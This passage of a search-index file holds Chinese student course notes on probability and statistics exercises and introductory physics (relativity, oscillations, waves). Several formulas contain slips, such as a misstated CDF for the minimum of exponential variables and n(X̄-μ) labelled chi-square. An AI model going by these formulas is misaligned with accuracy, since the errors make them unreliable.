\\\\ 1- \\lambda e^{-\\lambda x}, &amp; x\\gt 0 \\end{cases} \\\\ F_{min}(x) = \\begin{cases}0 , &amp; x\\le 0 \\\\ 1-\\lambda e^{-10\\lambda x} , &amp; x\\gt 0\\end{cases} \\\\ f_{min}(x) = \\begin{cases}0, &amp; x\\le 0 \\\\ 10\\lambda e^{-10\\lambda x}, &amp; x\\gt 0 \\end{cases}\\\\ \\begin{cases}E(X_{(1)}) = \\frac{1}{10\\lambda} \\\\ Var(X_{(1)}) = \\frac{1}{100\\lambda^2}\\end{cases} \\end{array}\\]"},{"location":"Courses/PS/review/#x","title":"\u767e\u53d8X\u65b9\u5206\u5e03","text":"<p>\u9898\u9762\uff1a \u5bf9\u4e8e\u603b\u4f53 \\(N(\\mu, 1)\\) \uff0c\u4e0b\u5217\u4e0d\u662f \\(\\chi^2\\) \u5206\u5e03\u7684\u662f\uff1a</p> <ul> <li>A. \\(\\sum_{i=1}^n (X_i -\\mu)^2\\) True \\(X_i\\) \u4e4b\u95f4\u72ec\u7acb\u540c\u5206\u5e03\uff0c\u6309\u5b9a\u4e49\u6c42\u5373\u53ef</li> <li>B. \\(2(X_n -X_1)^2\\) False \u53c2\u6570\u9519\u8bef\uff0c\u5e94\u4e3a \\(\\frac{1}{2}(X_n -X_1)^2\\)</li> <li>C. \\(\\sum_{i=1}^n( X_i -\\bar{X})^2\\) True \u76f8\u5f53\u4e8e \\((n-1)S^2\\)\uff0c\u7531\u4e8e\u603b\u4f53\u65b9\u5dee\u4e3a 1\uff0c\u6240\u4ee5\u670d\u4ece \\(\\chi^2( n-1)\\)</li> <li>D. \\(n(\\bar{X} -\\mu)\\) True \u6309\u5b9a\u4e49\u6c42\u5373\u53ef</li> </ul>"},{"location":"Courses/PS/review/#chapter-7","title":"Chapter 7. \u53c2\u6570\u4f30\u8ba1","text":""},{"location":"Courses/PS/review/#_18","title":"\u6c42\u65e0\u504f\u4f30\u8ba1\u91cf\u5e73\u5747\uff0c\u53ef\u4ee5\u5148\u6c42\u51fa\u5206\u5e03\u51fd\u6570\uff0c\u518d\u8ba1\u7b97\u5747\u503c","text":"<p>\u9898\u9762\uff1a \u603b\u4f53 \\(N(\\mu, \\sigma^2)\\) \uff0c\\(k\\sum_{i=1}^n |X_i -\\bar{X}|\\) \u662f\u53c2\u6570 \\(\\sigma\\) \u7684\u65e0\u504f\u4f30\u8ba1\u91cf\uff0c\u6c42 \\(k\\) \u7684\u5927\u5c0f</p> <p>\u89e3\u7b54\uff1a \u8981\u70b9\u5728\u4e8e\uff0c\u4f30\u8ba1\u91cf\u4e5f\u662f\u6b63\u6001\u5206\u5e03\uff0c\u5219\u5148\u6c42\u51fa\u5b83\u7684\u65b9\u5dee\u518d\u4ee3\u5165\u6b63\u6001\u516c\u5f0f</p> \\[\\begin{array}c \u4ee4 Y_i =X_i -\\bar{X} = -\\frac{X_1}{n} -\\frac{X_n}{n} -...+ \\frac{(n-1)X_i}{n} - ... - -\\frac{X_n}{n} \\\\ \\Rightarrow E(Y_i)= 0, \\ D(Y_i) = \\left[\\frac{1}{n^2}\\times \\left(n-1\\right) + \\frac{(n-1)^2}{ n^2}\\right]\\sigma ^2 = \\frac{n-1}{n}\\sigma ^2 \\\\ \\Rightarrow f_{ Y_i} (y)=\\frac{1}{\\sqrt{2\\pi \\frac{n-1}{n}}\\sigma } e^{-\\frac{y ^2}{ 2(\\frac{n-1}{n}\\sigma ^2)}} \\\\ \\text{\u8ba1\u7b97\u53ef\u5f97} E(|Y_i|) =\\int_{-\\infty} ^{+\\infty} |y|f(y)dy = \\sigma \\sqrt{\\frac{2(n-1)}{n\\pi}} \\\\ \\Rightarrow k\\sigma \\sqrt{\\frac{2(n-1)}{n\\pi}} = \\sigma \\\\ \\Rightarrow k= \\sqrt{\\frac{n\\pi}{2(n-1)}} \\end{array}\\]"},{"location":"Courses/PS/review/#_19","title":"\u591a\u4e2a\u72ec\u7acb\u6307\u6570\u5206\u5e03\u7684\u6700\u5c0f\u503c\u4ecd\u7136\u670d\u4ece\u6307\u6570\u5206\u5e03","text":"<p>\u9898\u9762\uff1a \u8bbe\u603b\u4f53\u670d\u4ece\u53c2\u6570\u4e3a \\(\\theta\\) \u7684\u6307\u6570\u5206\u5e03\uff0c\\(X_1, X_2, X_3\\) \u4e3a\u6765\u81ea\u603b\u4f53\u7684\u7b80\u5355\u968f\u673a\u6837\u672c\uff0c\u82e5 \\(\\bar{\\theta} = k\\min_{1\\le i\\le 3} (X_i)\\) \u4e3a \\(\\theta\\) \u7684\u65e0\u504f\u4f30\u8ba1\u91cf\uff0c\u6c42 \\(k\\) </p> <p>\u89e3\u7b54\uff1a </p> \\[\\begin{array}c F(M)= P(min \\lt M)= 1- P(min \\ge M) = 1- F(x\\ge M)^3= 1-3 e^{-3\\theta M} \\\\ \\Rightarrow E(M)= \\frac{1}{3\\theta} \\\\ \\Rightarrow k=3 \\end{array}\\]"},{"location":"Courses/PS/review/#_20","title":"\u5e73\u65b9\u540e\u4e0d\u4e00\u5b9a\u8fd8\u662f\u65e0\u504f\u4f30\u8ba1","text":"<p>\u9898\u9762\uff1a \u603b\u4f53 \\(B(1, p)\\) \uff0c\u53d6 n \u4e2a\u6837\u672c\uff0c\u6613\u8bc1\u660e \\(\\hat{p}_M = \\bar{X}\\) \u662f\u53c2\u6570 \\(p\\) \u7684\u65e0\u504f\u4f30\u8ba1\uff0c\u90a3\u4e48\u9a8c\u8bc1 \\((\\hat{p}_M^2)\\) \u662f\u5426\u662f \\(p^2\\) \u7684\u65e0\u504f\u4f30\u8ba1</p> <p>\u89e3\u7b54\uff1a \u522b\u641e\u6df7 \\(E(X^2) ,E(X)^2\\) \u5c31\u597d\u4e86\uff0c\u8981\u6ce8\u610f\u5dee\u522b</p> \\[\\begin{array}c E(\\hat{p}_M^2) =E(\\bar{X}^2) = \\frac{1}{n} \\left[\\sum E(X_i ^2) + 2 \\sum_{1\\le i\\lt j \\le n} E(X_i X_j) \\right]  \\\\ E(X_i ^2) = D(X_i) +E(X_i)^2 =p(1-p) +p^2 =p , E(X_i X_j) =E(X_i) E(X_j) =p^2 \\\\ \\Rightarrow E(\\hat{p}_M^2) = \\frac{1}{n^2}( np + n(n-1)p^2) \\ne p^2 \\\\ \\text{\u6240\u4ee5\u4e0d\u662f\u65e0\u504f\u4f30\u8ba1} \\end{array}\\]"},{"location":"Courses/PS/review/#_21","title":"\u4e8c\u9879\u5206\u5e03\u53ea\u7ed9\u51fa\u6837\u672c\u5747\u503c\u4e5f\u80fd\u6c42\u6781\u5927\u4f3c\u7136\u4f30\u8ba1","text":"<p>\u9898\u9762\uff1a \u8bbe\u603b\u4f53 \\(X\\sim B(4, p)\\)\uff0c\u4ece\u603b\u4f53\u4e2d\u62bd\u53d6\u5bb9\u91cf\u4e3a 8 \u7684\u4e00\u7ec4\u7b80\u5355\u968f\u673a\u6837\u672c\uff0c\u8bb0\u6837\u672c\u5747\u503c \\(\\bar{X}\\) \uff0c\u5219\u5206\u522b\u6c42\uff1a</p> <ul> <li>&lt;1&gt; \\(P(X=1)\\) \u7684\u6781\u5927\u4f3c\u7136\u4f30\u8ba1</li> <li>&lt;2&gt; \u7528 \\(\\bar{X} / 4\\) \u4f30\u8ba1 \\(p\\) \u65f6\uff0c\u5176\u5747\u65b9\u8bef\u5dee</li> </ul> <p>\u89e3\u7b54\uff1a \\(P(X=1)\\) \u7684\u4f30\u8ba1\uff0c\u53ef\u4ee5\u5148\u6c42\u53c2\u6570 \\(p\\) \u7684\u4f3c\u7136\u4f30\u8ba1\uff0c\u5728\u7528 \\(P(X=k) =C_n^k p^k (1-p)^{n-k}\\) \u4ee3\u5165</p> \\[\\begin{array}c L(p)= \\prod_{i=1}^8 P(X= X_i) = \\prod_{i=1}^8 C_4^{ X_i} \\times p^{\\sum_{i=1} ^8 X_i} \\times (1-p)^{ \\sum_{i=1}^8 (4- X_i)} \\\\ \\frac{d\\ln L(p)}{dp} = \\frac{\\sum X_i}{ p} - \\frac{32- \\sum X_i}{1-p} = 0 \\\\ \\Rightarrow \\hat{p} = \\frac{1}{32}\\sum X_i = \\frac{1}{4}\\bar{X} \\\\ \\Rightarrow P(X=1)= 4p(1- p)^3 = \\frac{\\bar{X}( 4-\\bar{X})^3}{64} \\end{array}\\] <p>\u5bf9\u4e8e\u5747\u65b9\u8bef\u5dee\uff0c\u7531\u4e8e \\(E(\\bar{X} / 4) =4p / 4 =p\\) \uff0c\u5373\u8fd9\u662f\u4e00\u4e2a\u65e0\u504f\u4f30\u8ba1\u91cf\uff0c\u5219\u5747\u65b9\u8bef\u5dee \\(Mse =Var\\) \uff0c\u5373 \\(Mse(\\bar{X} / 4) = Var(\\bar{X} / 4) = \\frac{1}{16} \\frac{4p(1-p)}{8}\\)</p>"},{"location":"Courses/PS/review/#chapter-9","title":"Chapter 9. \u5047\u8bbe\u68c0\u9a8c","text":""},{"location":"Courses/Physics/PhysicsI/","title":"\u5927\u7269 \u4e59 I","text":""},{"location":"Courses/Physics/PhysicsI/#_1","title":"\u96f6\u788e\u77e5\u8bc6\u70b9","text":"<p> \u7ea6 5533 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 28 \u5206\u949f</p> <p>Warning</p> <ul> <li>\u8ba9\u4f60\u6c42\u5177\u4f53\u6570\u503c\u7684\u9898\u76ee\uff0c\u5982\u679c\u586b\u7a7a\u540e\u9762\u6ca1\u6709\u7ed9\u5355\u4f4d\uff0c\u8981\u81ea\u5df1\u52a0\u4e0a!!!</li> <li>\u7ed9\u51fa\u6ce2\u5f62\u56fe\u8ba9\u4f60\u6c42\u6ce2\u51fd\u6570\uff0c\u6ce8\u610f\u8be5\u6ce2\u5f62\u56fe\u662f\u5426\u662f t=0s \u65f6\u7684\u6ce2\u5f62\u56fe\uff0c\u4e14\u8981\u5173\u6ce8\u6ce2\u5f62\u56fe\u4e2dx,y\u7684\u5355\u4f4d\u662f\u5426\u662f cm</li> <li>\u6c42\u7535\u573a\u5f3a\u5ea6,\u7535\u573a\u529b\u7b49\uff0c\u6700\u597d\u987a\u5e26\u5199\u4e0a\u65b9\u5411\uff0c\u5982 \\(F=\\frac{\\lambda ^2}{2\\pi \\varepsilon _0 r_0}\\overrightarrow{i}\\)</li> </ul>"},{"location":"Courses/Physics/PhysicsI/#_2","title":"\u5e38\u7528\u53d8\u6362","text":""},{"location":"Courses/Physics/PhysicsI/#_3","title":"\u5982\u679c\u8981\u6c42\u901f\u5ea6\u4e0e\u8ddd\u79bb\u800c\u4e0d\u662f\u65f6\u95f4\u7684\u5173\u7cfb","text":"\\[ \\frac{dv}{dt} = v \\frac{dv}{dx} \\]"},{"location":"Courses/Physics/PhysicsI/#_4","title":"\u66f2\u7387\u534a\u5f84:","text":"\\[ \\rho =\\frac{1}{k}=\\frac{[1+{f'}^{2} (x)]^\\frac{3}{2}} {|f''(x)|} \\] <p>\u867d\u7136\u4f46\u662f\uff0c\u5e73\u5e38\u5982\u679c\u9047\u5230\u770b\u4f3c\u9700\u8981\u7528\u66f2\u7387\u534a\u5f84\u6c42\u6cd5\u5411\u52a0\u901f\u7684\u60c5\u51b5\uff0c\u8bf7\u60f3\u8c61\u80fd\u4e0d\u80fd\u5148\u6c42\u51fa\u603b\u52a0\u901f\u5ea6\uff0c\u6709</p> \\[ {a_\u603b}^2 ={a_\\tau}^2 + {a_n}^2\\ \\ \\ \u5176\u4e2da_\\tau\u4e00\u822c\u6307\u5207\u5411\u52a0\u901f\u5ea6 \\]"},{"location":"Courses/Physics/PhysicsI/#_5","title":"\u5e38\u7528\u8f6c\u52a8\u60ef\u91cf","text":""},{"location":"Courses/Physics/PhysicsI/#_6","title":"\u4ee5\u76f4\u5f84\u4e3a\u8f74\u7684\u7ec6\u5706\u73af\u53ca\u5176\u63a8\u5bfc","text":""},{"location":"Courses/Physics/PhysicsI/#_7","title":"\u5b9e\u5fc3\u7403\u8f6c\u52a8\u60ef\u91cf\u7684\u63a8\u5bfc","text":"<p>\u5728\u8ba1\u7b97\u5b9e\u5fc3\u7403\u7684\u65f6\u5019\u4e0d\u8981\u7528d\u03b8\u6765\u4f5c\u4e3a\u5fae\u5143\uff0c\u4f46\u662f\u8584\u7403\u58f3\u53ef\u4ee5</p>"},{"location":"Courses/Physics/PhysicsI/#_8","title":"\u5e73\u884c\u8f74\u5b9a\u7406","text":"<p>$$ J=J_C+mh^2 $$ \u5176\u4e2d:</p> <ul> <li>\\(J\\)\u662f\u4efb\u4e00\u8f6c\u8f74\u7684\u8f6c\u52a8\u60ef\u91cf</li> <li>\\(J_C\\)\u662f\u901a\u8fc7\u8d28\u5fc3\u8f6c\u8f74\u7684\u8f6c\u52a8\u60ef\u91cf</li> <li>\\(m\\)\u662f\u521a\u4f53\u7684\u8d28\u91cf</li> <li>\\(h\\)\u662f\u4e24\u8f74\u95f4\u7684\u8ddd\u79bb</li> </ul>"},{"location":"Courses/Physics/PhysicsI/#_9","title":"\u5782\u76f4\u8f74\u5b9a\u7406","text":"<p>\u5728\u521a\u4f53\u4e3a\u8584\u677f\uff0c\u4e14\u4f4d\u4e8exy\u5e73\u9762\u5185\u7684\u6761\u4ef6\u4e0b:</p> \\[ J_z=J_x+J_y \\] <p>\u5176\u4e2d\uff0c\\(J_x\u3001J_y\u3001J_z\\)\u5206\u522b\u4e3a\u5bf9x\u3001y\u3001z\u8f74\u7684\u8f6c\u52a8\u60ef\u91cf</p> <p>\u4e0e\u5730\u9762\u65e0\u6ed1\u52a8\u4e5f\u6709\u6469\u64e6\u529b</p> <p></p>"},{"location":"Courses/Physics/PhysicsI/#_10","title":"\u4e24\u4e2a\u7269\u4f53\u53ea\u6709\u4fdd\u5b88\u529b\u7684\u60c5\u51b5\u4e0b\u89d2\u52a8\u91cf\u5b88\u6052","text":"<p>\u4fdd\u5b88\u529b: \u6cbf\u4efb\u610f\u95ed\u5408\u56de\u8def\u505a\u529f\u4e3a\u96f6\u7684\u529b\uff0c\u4f8b\u5982\u5f39\u7c27\u7b80\u8c10\u8fd0\u52a8\u7684\u5f39\u529b\u3001\u91cd\u529b\u3001\u201c\u6709\u5fc3\u529b\u201d(\u5982\u4e07\u6709\u5f15\u529b)</p> <p>\u5982\u6b64\u9898\u7684\u7b2c\u4e00\u5c0f\u95ee\uff0c\u53ef\u4ee5\u7528\u89d2\u52a8\u91cf\u5b88\u6052\u89e3\u7b54: \\(mv_0D =mvd\\)</p> <p></p> <p>\u4fdd\u5b88\u529b\u5224\u65ad\u4f9d\u636e:</p> \\[\\begin{gather} (1)\\oint F_\u4fdddr=0 \\\\ (2)\\frac{\\partial F_x}{\\partial y} = \\frac{\\partial F_y}{\\partial x}\\ (\u5bf9\u4e8e\u4e8c\u7ef4) \\end{gather} \\] <p>\u5e38\u89c1\u975e\u4fdd\u5b88\u529b:\u6469\u64e6\u529b\u3001\u7206\u70b8\u529b\u3001\u6da1\u65cb\u7535\u573a\u529b\u3001\u78c1\u529b\u3001\u975e\u5f39\u6027\u51b2\u51fb\u529b</p> <p>\u53ea\u6709\u5185\u529b\u662f\u4fdd\u5b88\u529b\uff0c\u624d\u80fd\u5f15\u5165\u52bf\u80fd\uff1b\u7cfb\u7edf\u5728\u4efb\u610f\u4f4d\u7f6e\u7684\u52bf\u80fd\u7b49\u4e8e\u4ece\u8be5\u4f4d\u7f6e\u6cbf\u4efb\u610f\u8def\u5f84\u53d8\u5230\u52bf\u80fd\u96f6\u70b9\u8fc7\u7a0b\u4e2d\uff0c\u4fdd\u5b88\u5185\u529b\u505a\u7684\u529f\u3002</p> <p>\u3010\u9519\u9898\u3011\uff1a  \u4eba\u9020\u5730\u7403\u536b\u661f\u7684\u692d\u5706\u8f68\u9053\u79bb\u5730\u5fc3\u6700\u8fd1\u8ddd\u79bb\u662f3R\uff0c\u6700\u8fdc\u8ddd\u79bb\u662f6R\uff0c\u53d6\u5730\u7403\u8868\u9762\u52a0\u901f\u5ea6\u4e3ag\uff0c\u5219\u6c42\u6b64\u536b\u661f\u7684\u6700\u5c0f\u901f\u7387\u548c\u6700\u5927\u901f\u7387\u3002</p> <p></p> <p>\u7531\u4e8e\u52bf\u80fd\u79bb\u8d8a\u8fdc\u5c31\u8d8a\u5927\uff0c\u56e0\u6b64\u7cfb\u7edf\u7684\u673a\u68b0\u80fd\u5e94\u4e3a\\(\\frac{1}{2}mv^2 +(- \\frac{{GMm}}{r})\\)</p> <p>\u8fd9\u4e5f\u662f\u89d2\u52a8\u91cf\u5b88\u6052</p> <p></p>"},{"location":"Courses/Physics/PhysicsI/#_11","title":"\u6d1b\u4f26\u5179\u53d8\u6362","text":"\\[ x'=\\frac{x-ut}{\\sqrt{1-\\frac{u^2}{c^2}}},\\ t'=\\frac{t-\\frac{ux}{c^2}}{\\sqrt{1-\\frac{u^2}{c^2}}} \\]"},{"location":"Courses/Physics/PhysicsI/#_12","title":"\u957f\u5ea6\u6536\u7f29","text":"\\[ l'=l_0\\sqrt{1- \\frac{u^2} {c^2}} \\] <p>\u6240\u4ee5\u89c2\u5bdf\u8fd0\u52a8\u4e2d\u7684\u7cfb\uff08\u76f8\u5bf9\u89c2\u6d4b\u8005\u7684\u7cfb\u800c\u8a00\uff09\u4e2d\u6746\u5b50\u7684\u957f\u5ea6\u6bd4\u9759\u6b62\u957f\u5ea6\u77ed</p> <p>Note</p> <p>\u5982\u679c\u89c2\u5bdf\u8fd0\u52a8\u4e2d\u7684\u7cfb\u4e2d\u65b9\u5757\u7684\u4f53\u79ef\uff0c\u5219\u4e0d\u4e00\u5b9a\u6240\u6709\u8fb9\u957f\u90fd\u53d8\u77ed\uff0c\u53ef\u80fd\u53ea\u6709\u76f8\u5bf9\u4e8e\u89c2\u5bdf\u8005\u8fd0\u52a8\u7684\u90a3\u4e00\u4e2a \\(l\\) \u53d8\u77ed\u4e86</p>"},{"location":"Courses/Physics/PhysicsI/#_13","title":"\u65f6\u95f4\u5ef6\u7f13","text":"\\[ t=\\frac{t'}{\\sqrt{1-\\frac{u^2} {c^2}}} \\] <p>\u770b\u8fd0\u52a8\u7cfb\u4e2d\u7684\u7269\u4f53\u6709\u65f6\u95f4\u5ef6\u7f13\u6548\u5e94</p> <p>\u5047\u5b9a\u5728\u5730\u7403\u4e0a\u89c2\u5bdf\u5230\u4e00\u9897\u8109\u51b2\u661f\u7684\u8109\u51b2\u5468\u671f\u4e3a 0.5s \uff0c\u4e14\u8fd9\u9897\u661f\u6b63\u6cbf\u89c2\u5bdf\u65b9\u5411\u4ee5\u8fd0\u884c\u901f\u5ea6 0.8c \u79bb\u6211\u4eec\u800c\u53bb\uff0c\u90a3\u4e48\u8fd9\u9897\u661f\u7684\u56fa\u6709\u8109\u51b2\u5468\u671f\u5e94\u8be5\u662f 0.3s</p>"},{"location":"Courses/Physics/PhysicsI/#_14","title":"\u8fd0\u52a8\u7269\u4f53\u7684\u8d28\u91cf","text":"\\[ m=\\frac{m_0} { \\sqrt {1-\\frac{u^2} {c^2}}} \\] <p>\u5176\u4e2dm\u4e3a\u7269\u4f53\u4ee5\u901f\u5ea6u\u8fd0\u52a8\u65f6\u7684\u8d28\u91cf\uff0cm<sub>0</sub>\u4e3a\u7269\u4f53\u5728\u76f8\u5bf9\u9759\u6b62\u53c2\u8003\u7cfb\u4e2d\u7684\u8d28\u91cf</p> <p>\u56e0\u6b64\uff0c\u8fd0\u52a8\u4e2d\u7269\u4f53\u8d28\u91cf\u8f83\u5927</p>"},{"location":"Courses/Physics/PhysicsI/#_15","title":"\u7231\u56e0\u65af\u5766\u901f\u5ea6\u53d8\u6362\u516c\u5f0f","text":"\\[ v_x'=\\frac{v_x-u}{1-\\frac{v_xu}{c^2}},v_y'=\\frac{v_y\\sqrt{1-\\frac{u^2}{c^2}}}{1-\\frac{v_xu}{c^2}} \\] <p>\u4f8b\u5982\uff0c\u53d6\u5b9e\u9a8c\u5ba4\u4e3aS\u7cfb\uff0c\u89c2\u5bdf\u8005\u4e3aS\u2018\u7cfb\uff0c\u4e00\u4e2a\u7c92\u5b50\u5728S\u7cfb\u4e2d\u4ee50.6c\u8fd0\u52a8\uff0c\u89c2\u5bdf\u8005\u4e0e\u7c92\u5b50\u540c\u5411\u4ee50.8c\u8fd0\u52a8\uff0c\u5219\u5728S'\u7cfb\u4e2d\u7c92\u5b50\u901f\u5ea6\u4e3a:</p> \\[ v_x'=\\frac{0.6c-0.8c}{1-0.6*0.8}=\\frac{-5}{13}c \\]"},{"location":"Courses/Physics/PhysicsI/#_16","title":"\u80fd\u91cf\\\u52a8\u80fd\\\u52a8\u91cf","text":"<ul> <li>\u9759\u6b62\u7269\u4f53\u7684\u80fd\u91cf: \\(E_0 =m_0c^2\\)</li> <li>\u8fd0\u52a8\u7269\u4f53\u7684\u80fd\u91cf: \\(E=mc^2 =\\frac{m_0 c^2} { \\sqrt {1-\\frac{u^2} {c^2}}}\\)</li> <li>\u8fd0\u52a8\u7269\u4f53\u7684\u52a8\u80fd: \\(E_k =mc^2 -m_0c^2\\)</li> <li>\u8fd0\u52a8\u7269\u4f53\u7684\u52a8\u91cf: \\(p=mv\\)</li> </ul>"},{"location":"Courses/Physics/PhysicsI/#_17","title":"\u673a\u68b0\u632f\u52a8","text":"\\[ x=A\\cos (\\omega t+ \\varphi) \\] \\[ v= \\frac{{dx}}{{dt}} =-\\omega A\\sin (\\omega t+\\varphi)  \\] \\[ a= \\frac{d^2x}{dt^2} =-\\omega ^2 A\\cos (\\omega t +\\varphi) =-\\omega ^2 x\\ \\ \\Rightarrow\\ \\  \\omega=\\sqrt{ \\frac{k}{m} } \\] <p>\u5f39\u6027\u52bf\u80fd\\(E_p= \\frac{1}{2} kx^2= \\frac{1}{2}kA^2 \\cos ^2 (\\omega t+\\varphi)\\)</p> <p>\u52a8\u80fd\\(E_k= \\frac{1}{2}mv^2 = \\frac{1}{2}m\\omega ^2 A^2 \\sin ^2 (\\omega t+\\varphi)= \\frac{1}{2}kA^2 \\sin ^2 (\\omega t+\\varphi)\\)</p> <p>\u56e0\u6b64\u7cfb\u7edf\u7684\u603b\u673a\u68b0\u80fd\u4e3a \\(E= \\frac{1}{2}kx^2 + \\frac{1}{2}mv^2 = \\frac{1}{2}kA^2\\)</p>"},{"location":"Courses/Physics/PhysicsI/#_18","title":"\u5e38\u89c1\u7684\u7b80\u8c10\u8fd0\u52a8","text":"<ul> <li>\u5355\u6446</li> </ul> <p>\u5355\u6446\u6240\u53d7\u7684\u91cd\u529b\u7684\u5207\u5411\u5206\u529b: \\(mg\\sin \\theta\\)</p> <p>\u5355\u6446\u5c0f\u7403\u7684\u5207\u5411\u52a0\u901f\u5ea6\\(a_\\tau =l(d^2\\theta / dt^2)\\)</p> <p>\u7531\u725b\u987f\u7b2c\u4e8c\u5b9a\u5f8b\u5f97\u5230 \\(mg\\sin \\theta =m l(\\frac{d^2\\theta}{dt^2})\\) \uff0c\u5f53\\(\\theta\\)\u5f88\u5c0f\u7684\u65f6\u5019 \\(\\sin \\theta \\approx  \\theta\\)</p> <p>\u56e0\u6b64\u6709\\(- \\frac{g}{l}\\theta =\\frac{d^2\\theta}{dt^2}=- \\omega ^2 \\theta\\) (\u89d2\u52a0\u901f\u5ea6\u4e3a \\(-\\frac{g}{l}\\theta\\))</p> <p>\u5373:</p> \\[ \\theta =\\theta _m\\cos (\\omega t+\\varphi)\uff0c\u5176\u4e2d\\omega =\\sqrt{\\frac{g}{l}} \\] <ul> <li>\u590d\u6446\uff08\u7269\u7406\u6446\uff09</li> </ul> <p></p> <p></p> <ul> <li>\u626d\u6446</li> </ul> \\[ M=-k\\theta\\ ; \\ M=J \\frac{d^2\\theta}{ dt^2} =-J\\omega ^2\\theta\\ \\ \\Rightarrow \\omega =\\sqrt{\\frac{k}{J}} \\] <p>Example</p> \u5e38\u89c4\u89e3\u6cd5 <p></p> \u529f\u80fd\u5173\u7cfb <p>\u7531\u4e8e\u7b80\u8c10\u632f\u52a8\u603b\u673a\u68b0\u80fd\u4e0d\u53d8\uff0c\u6709\\(\\frac{1}{2}kx^2 + \\frac{1}{2}mv^2\\) \uff0c\u5206\u6790\u9898\u76ee\u53ef\u77e5\uff1a</p> <p>\u7269\u4f53\u52a8\u80fd\uff1a \\(\\frac{1}{2}mv^2\\)</p> <p>\u6ed1\u5757\u52a8\u80fd\uff1a \\(\\frac{1}{2}J\\omega ^2 = \\frac{1}{4}Mv^2\\)</p> <p>\u5f39\u6027\u52bf\u80fd\uff1a \\(\\frac{1}{2}kx^2\\) (\u6b64\u5904x\u6307\u76f8\u5bf9\u5e73\u8861\u4f4d\u7f6e\u7684\u4f4d\u79fb\uff0c\u4e0d\u4e00\u5b9a\u662f\u5f39\u7c27\u539f\u957f\u5904)</p> <p>\u56e0\u6b64\u7cfb\u7edf\u673a\u68b0\u80fd \\(E=\\frac{1}{2}(m+ \\frac{1}{2}M)v^2 + \\frac{1}{2}kx^2\\)</p> <p>\u7b49\u5f0f\u5173\u4e8e\u65f6\u95f4t\u6c42\u5bfc\uff1a \\(0=(m+ \\frac{1}{2}M)v \\frac{{dv}}{{dt}}+kx \\frac{{dx}}{{dt}}\\)</p> <p>\u7ea6\u6389 \\(v= \\frac{{dx}}{{dt}}\\)\uff0c\u4e14\u6709 \\(\\frac{{dv}}{{dt}}= \\frac{d^2x}{dt ^2}\\)\u5f97\u5230 \\((m+ \\frac{1}{2}M)\\frac{d^2x}{dt ^2} +kx=0\\)</p> <p>\u56e0\u6b64\u76f4\u63a5\u5f97\u5230\uff1a \\(T= \\frac{2\\pi}{\\omega} =2\\pi \\sqrt{\\frac{M/2+m}{k}}\\)</p> <ul> <li>\u5b9e\u9645\u4e0a\uff0c\u5229\u7528\u603b\u673a\u68b0\u80fd\u5173\u4e8e\u65f6\u95f4 t \u6c42\u5bfc\u4e3a 0 \u8fd9\u4e00\u6027\u8d28\uff0c\u53ef\u4ee5\u7528\u529f\u80fd\u5206\u6790\u4ee3\u66ff\u53d7\u529b\u5206\u6790\u6765\u6c42\u7b80\u8c10\u8fd0\u52a8\u5468\u671f</li> </ul> <p>Example</p> <p></p>"},{"location":"Courses/Physics/PhysicsI/#_19","title":"\u632f\u52a8\u7684\u5408\u6210","text":""},{"location":"Courses/Physics/PhysicsI/#_20","title":"\u540c\u65b9\u5411\u540c\u9891\u7387\u7684\u7b80\u8c10\u632f\u52a8\u7684\u5408\u6210","text":""},{"location":"Courses/Physics/PhysicsI/#_21","title":"\u76f8\u4e92\u5782\u76f4\u7684\u7b80\u8c10\u632f\u52a8\u7684\u5408\u6210","text":"\u8bc1\u660e"},{"location":"Courses/Physics/PhysicsI/#_22","title":"\u673a\u68b0\u6ce2","text":"<p>\u6ce2\u52a8\u65b9\u7a0b\u6700\u57fa\u672c\u7684\u5f62\u5f0f \\(y(x,t)=A\\cos [\\omega (t- \\frac{x}{u})+ \\varphi]\\)</p> <ul> <li>\u6ce2\u901fu\uff1a\u632f\u52a8\u4f20\u64ad\u7684\u901f\u5ea6</li> <li>\u6ce2\u957f\\(\\lambda\\)\uff1a\u76f8\u4f4d\u5dee\u4e3a \\(2\\pi\\) (\u8fd0\u52a8\u5b8c\u5168\u76f8\u540c) \u7684\u4e24\u4e2a\u8d28\u70b9\u7684\u8ddd\u79bb</li> <li>\u6b64\u65b9\u7a0b\u7684\u6ce2\u662f\u6b63\u5411\u4f20\u64ad\u7684\uff0c\u82e5\u662f\u8d1f\u5411\u4f20\u64ad\uff0c\u5c06 x \u6539\u6210 -x (\u53ef\u4ee5\u770b\u4f5c u \u53d8\u6210 -u)</li> <li>\u5e26\u5165<code>x</code>\u540e\uff0c\u6ce2\u52a8\u65b9\u7a0b\u6210\u4e3a\u8be5\u5904\u8d28\u70b9\u7684\u632f\u52a8\u65b9\u7a0b</li> <li>\u5e26\u5165<code>t</code>\u540e\uff0c\u6ce2\u52a8\u65b9\u7a0b\u6210\u4e3a\u8be5\u65f6\u523b\u7684\u6ce2\u5f62</li> </ul>"},{"location":"Courses/Physics/PhysicsI/#_23","title":"\u6ce2\u7684\u80fd\u91cf","text":"<p>\u4efb\u53d6\u4f53\u5143\\(\\Delta V\\),\u8d28\u91cf\u4e3a\\(\\Delta m =\\rho \\Delta V\\) ,\u6ce2\u4f20\u64ad\u5230\u6b64\u4f53\u5143\u65f6\uff0c\u4f53\u5143\u5177\u6709\u52a8\u80fd \\(W_k\\) \u548c\u52bf\u80fd \\(W_p\\) \uff0c\u7531\u4e8e\u7b80\u8c10\u6ce2\u8868\u8fbe\u5f0f\u4e3a \\(y(x,t)=A\\cos \\omega (t - \\frac{x}{u})\\) \uff0c\u53ef\u4ee5\u8bc1\u660e \\(W_k =W_p = \\frac{1}{2}\\rho A^2 \\omega ^2 (\\Delta V)\\sin ^2 \\omega (t- \\frac{x}{u})\\)</p> <p>\u5373\uff0c\u4f53\u5143\u7684\u603b\u673a\u68b0\u80fd\u4e3a \\(\\rho A^2 \\omega ^2 (\\Delta V)\\sin ^2 \\omega (t- \\frac{x}{u})\\)</p> <p>\u8bc1\u660e\u8fc7\u7a0b</p> <p>\u5bf9\u4e8e\u4f53\u5143\u7684\u52a8\u80fd\uff0c\\(W_k =\\frac{1}{2}(\\Delta m)v^2 =\\frac{1}{2} \\rho (\\Delta V)v^2\\) ,</p> <p>\u53c8\\(v= \\frac{\\partial y}{\\partial t} = -A\\omega \\sin \\omega (t-\\frac{x}{u})\\)</p> <p>\u5f97\u5230\\(W_k = \\frac{1}{2}\\rho A^2 \\omega ^2 (\\Delta V)\\sin ^2 \\omega (t- \\frac{x}{u})\\)</p> 